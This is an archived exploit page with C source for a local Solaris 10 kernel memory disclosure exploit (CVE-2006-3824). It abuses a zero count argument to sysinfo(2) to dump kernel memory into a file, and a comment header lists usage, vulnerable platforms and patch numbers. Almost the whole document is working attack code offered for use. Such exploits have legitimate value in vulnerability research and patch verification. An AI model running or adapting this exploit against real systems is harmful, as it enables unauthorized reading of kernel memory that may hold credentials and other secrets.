<html><head><title>Solaris 10 sysinfo(2) Local Kernel Memory Disclosure Exploit</title></head><pre>/*
 * $Id: raptor_sysinfo.c,v 1.2 2006/08/22 13:47:54 raptor Exp $
 *
 * raptor_sysinfo.c - Solaris sysinfo(2) kernel memory leak
 * Copyright (c) 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;
 *
 * systeminfo.c for Sun Solaris allows local users to read kernel memory via 
 * a 0 variable count argument to the sysinfo system call, which causes a -1 
 * argument to be used by the copyout function. NOTE: this issue has been 
 * referred to as an integer overflow, but it is probably more like a 
 * signedness error or integer underflow (CVE-2006-3824).
 *
 * http://en.wikipedia.org/wiki/Pitagora_Suicchi
 *
 * Greets to prdelka, who also exploited this vulnerability.
 *
 * I should also definitely investigate the old sysinfo(2) vulnerability 
 * described in CVE-2003-1062, affecting Solaris/SPARC 2.6 through 9 and 
 * Solaris/x86 2.6 through 8... It may come in handy sooner or later;)
 *
 * Usage:
 * $ gcc raptor_sysinfo.c -o raptor_sysinfo -Wall
 * $ ./raptor_sysinfo kerndump 666666
 * [...]
 * $ ls -l kerndump 
 * -rwx------   1 raptor   other     666666 Aug 22 14:41 kerndump
 *
 * Vulnerable platforms (SPARC):
 * Solaris 10 without patch 118833-09 [tested]
 *
 * Vulnerable platforms (x86):
 * Solaris 10 without patch 118855-06 [untested]
 */

#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;strings.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/systeminfo.h&gt;

#define	INFO1	&quot;raptor_sysinfo.c - Solaris sysinfo(2) kernel memory leak&quot;
#define	INFO2	&quot;Copyright (c) 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;&quot;

#define BUFSIZE 536870911

int 	errno;

int main(int argc, char **argv)
{
	int 	fd;
	size_t	out, bufsize = BUFSIZE;
	char	*buf;

	/* print exploit information */
	fprintf(stderr, &quot;%s\n%s\n\n&quot;, INFO1, INFO2);

	/* read command line */
	if (argc &lt; 2) {
		fprintf(stderr, &quot;usage: %s outfile [outsize]\n\n&quot;, argv[0]);
		exit(1);
	}
	if (argc &gt; 2)
		if ((bufsize = atoi(argv[2])) == 0) {
			fprintf(stderr, &quot;Error (atoi): invalid outsize\n&quot;);
			exit(1);
		}

	/* print some output */
	fprintf(stderr, &quot;Using outfile\t: %s\n&quot;, argv[1]);
	fprintf(stderr, &quot;Using outsize\t: %u\n\n&quot;, bufsize);

	/* prepare the output buffer */
	if ((buf = (char *)malloc(bufsize)) == NULL) {
		perror(&quot;Error (malloc)&quot;);
		fprintf(stderr, &quot;Hint: Try again with a smaller output size\n&quot;);
		exit(1);
	}
	memset(buf, 0, bufsize);

	/* Pitagora Suicchi! */
	sysinfo(SI_SYSNAME, buf, 0);

	/* save output to outfile */
	if ((fd = open(argv[1], O_RDWR | O_CREAT | O_TRUNC, 0700)) &lt; 0) {
		perror(&quot;Error (open)&quot;);
		free(buf);
		exit(1);
	}
	out = write(fd, buf, bufsize);
	fprintf(stderr, &quot;Pitagora Suicchi! %u bytes written to %s\n&quot;, out, argv[1]);
	fprintf(stderr, &quot;Hint: Try also with a bigger output size\n&quot;);

	close(fd);
	free(buf);

	exit(0);
}

// milw0rm.com [2006-08-22]</pre></html>